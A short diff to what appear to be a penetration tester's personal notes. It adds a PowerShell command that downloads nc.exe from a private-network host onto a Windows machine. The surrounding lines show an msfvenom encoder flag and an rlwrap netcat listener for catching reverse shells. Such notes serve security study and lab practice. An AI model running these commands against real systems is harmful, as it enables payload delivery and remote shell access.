@@ -8,6 +8,10 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 Random notes
 -e x86/shikata_ga_nai
 
+```
+'powershell /c Invoke-WebRequest -Uri "http://192.168.49.245/nc.exe" -OutFile "C:\test\nc.exe"
+```
+
 This adds up/down/left/right functionality!
 ```
 rlwrap nc -lvp [PORT]
